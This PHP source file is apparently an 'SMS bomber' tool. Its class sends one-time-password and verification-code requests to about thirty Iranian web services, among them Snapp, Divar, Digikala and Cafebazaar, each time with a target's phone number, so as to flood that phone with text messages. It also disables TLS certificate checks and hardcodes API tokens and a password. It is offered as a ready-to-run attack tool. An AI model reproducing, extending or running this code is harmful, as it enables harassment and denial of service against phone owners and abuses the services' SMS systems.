<?php

/* coded by @parsa002am
date : 1401/02/02
class smsbomber002
 */
error_reporting(0);

class mbomber002
{
    private $Number;
    public function __construct($NUM)
    {
        $this->$Number = $NUM;
    }

    public function s002($lurl, $datas = [], $headers = [],$type=1)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $lurl);

        $headers[] = 'Content-Type:application/json';

        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        if($type==1)
        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($datas, true));
        else
        curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
        //curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
        return curl_exec($ch);
    }
    public function sg002($lurl, $headers = [])
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $lurl);
        $headers[] = 'Content-Type:application/json';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        

        return curl_exec($ch);
    }

}

class smsbomber002 extends mbomber002
{
    public function stapsi()
    {
        return $this->s002("https://api.tapsi.cab/api/v2/user", ["credential" => ["phoneNumber" => $this->$Number, "role" => "PASSENGER"]]);
    }
    public function Sbimebazar()
    {
        return $this->s002("https://bimebazar.com/accounts/api/login_sec/", ["username" => $this->$Number]);
    }
    public function Salopeyk()
    {
        return $this->s002("https://api.alopeyk.com/api/v2/login?platform=pwa-mobile", ["type" => "CUSTOMER", "model" => "Chrome 96.0.4664.45", "platform" => "pwa-mobile", "version" => "8.0.0", "manufacturer" => "Android", "isVirtual" => false, "serial" => true, "app_version" => "1.2.3", "uuid" => true, "phone" => $this->$Number]);
    }
    public function Sdivar()
    {
        return $this->s002("https://api.divar.ir/v5/auth/authenticate", ["phone" => $this->$Number]);
    }
    public function Snamava()
    {
        return $this->s002("https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request", ["UserName" => '+98' . $this->$Number]);
    }
    public function Sezpay()
    {
        return $this->s002("https://app.ezpay.ir:8443/open/v1/user/validation-code", ["phoneNumber" => $this->$Number]);
    }
    public function Sbazzar()
    {
        return $this->s002("https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", ["properties" => ["language" => 2, "clientID" => "dasda98dsajdb" . rand(100, 999), "deviceID" => "dasda98dsajdb" . rand(100, 999), "clientVersion" => "web"], "singleRequest" => ["getOtpTokenRequest" => ["username" => $this->$Number]]]);
    }
    public function Sdigikala()
    {
        return $this->s002("https://api.digikala.com/v1/user/authenticate/", ["username" => $this->$Number]);
    }
    public function Sbimecom()
    {
        return $this->s002("https://restcore.bimeh.com/v1/authentication", ["MobileNumber" => $this->$Number], ["token: da4aa2f8-70d9-4d56-b577-3162dfae2c0f"]);
    }
    public function Ssnapp()
    {
        return $this->s002("https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", ["cellphone" => $this->$Number]);
    }
    public function Sbasalam()
    {
        return $this->s002("https://auth.basalam.com/otp-request", ["mobile" => $this->$Number]);
    }
    public function Ssnappmarket()
    {
        return $this->s002("https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=" . $this->$Number);
    }
    public function Salibaba()
    {
        return $this->s002("https://ws.alibaba.ir/api/v3/account/mobile/otp", ["phoneNumber" => $this->$Number]);
    }
    public function Ssibche()
    {
        return $this->s002("https://api.sibche.com/profile/sendCode", ["mobile" => $this->$Number]);
    }
    public function Spezeshket()
    {
        return $this->s002("https://api.pezeshket.com/core/v1/auth/requestCode", ["mobileNumber" => $this->$Number]);
    }
    public function Ssnapptrip()
    {
        return $this->s002("https://www.snapptrip.com/register", ["lang"=>"fa","country_id"=>"860","password"=>"parsa.002.am","country_code"=>"+98","email"=>"parsa.002.am@gmail.com","mobile_phone" => $this->$Number]);
    }
    public function Schamedon()
    {
        return $this->s002("https://chamedoon.com/api/v1/membership/guest/request_mobile_verification", ["mobile" => $this->$Number]);
    }
    public function Ssnappdoctor()
    {
        return $this->sg002("https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/".$this->$Number."/sms?cCode=+98");
    }
    public function Sgap()
    {
        return $this->sg002("https://core.gap.im/v1/user/add.json?mobile=".$this->$Number);
    }
    public function Strob()
    {
        return $this->sg002("https://api.torob.com/a/phone/send-pin/?phone_number=".$this->$Number);
      
    }
    public function Sbanimode()
    {
        return $this->s002("https://mobapi.banimode.com/api/v2/auth/request", ["phone" => $this->$Number]);
      
    }
    public function Sbehtarino()
    {
        return $this->s002("https://api.behtarino.com/api/v1/users/phone_verification/", ["phone" => $this->$Number]);
      
    }
    public function Ssheypoor()
    {
        return $this->s002("https://www.sheypoor.com/api/v10.0.0/auth/send", ["username" => $this->$Number]);
      
    }
    public function Skilid()
    {
        return $this->s002("https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", ["mobile" => $this->$Number]);
      
    }
    public function Sshabesh()
    {
        return $this->s002("https://api.shabesh.com/api/checknumber", ["mobile" => $this->$Number]);
      
    }
    public function S2nabsh()
    {
        return $this->s002("https://api.2nabsh.com/v1/verifications/send", ["mobile" => $this->$Number],["client-token: 598eec18374b5"]);
      
    }
    public function Sshab()
    {
        return $this->s002("https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile", ["mobile" => $this->$Number]);
      
    }
    public function Ssinamatiket()
    {
        return $this->s002("https://cinematicket.org/api/v1/users/signup", ["phone_number" => $this->$Number]);
      
    }
    public function Sirantiket()
    {
        return $this->s002("https://www.irantic.com//api/login/request", ["mobile" => $this->$Number]);
      
    }
    public function Ssabziman()
    {
        return $this->s002("https://sabziman.com/wp-admin/admin-ajax.php", "action=newphoneexist&phonenumber=".$this->$Number,["content-type: application/x-www-form-urlencoded; charset=UTF-8"],0);
      
    }
    public function Sbrozmart()
    {
        return $this->s002("https://api.beroozmart.com/api/pub/account/send-otp", ["mobile" => $this->$Number ,"sendViaSms"=>true ,"email"=> null,"sendViaEmail"=>false]);
      
    }
    public function Szarinpall()
    {
        return $this->s002("https://next.zarinpal.com/api/oauth/initialize", ["username" => $this->$Number]);
      
    }
  
}
